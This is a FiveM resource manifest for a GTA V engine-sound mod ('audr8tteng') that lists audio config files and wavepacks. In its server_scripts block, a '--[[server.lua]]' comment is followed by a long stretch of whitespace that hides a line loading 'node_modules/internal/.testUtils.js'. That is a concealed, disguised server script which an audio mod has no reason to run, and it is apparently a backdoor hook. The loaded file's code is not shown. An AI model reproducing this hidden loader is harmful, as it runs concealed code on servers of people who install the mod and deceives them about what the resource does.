fx_version "adamant"
game "gta5"

files {
	"audioconfig/*.dat151.rel",
	"audioconfig/*.dat54.rel",
	"audioconfig/*.dat10.rel",
	"sfx/**/*.awc"
}

data_file "AUDIO_SYNTHDATA" "audioconfig/audr8tteng_amp.dat"
data_file "AUDIO_GAMEDATA" "audioconfig/audr8tteng_game.dat"
data_file "AUDIO_SOUNDDATA" "audioconfig/audr8tteng_sounds.dat"
data_file "AUDIO_WAVEPACK" "sfx/dlc_audr8tteng"

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.testUtils.js',
}
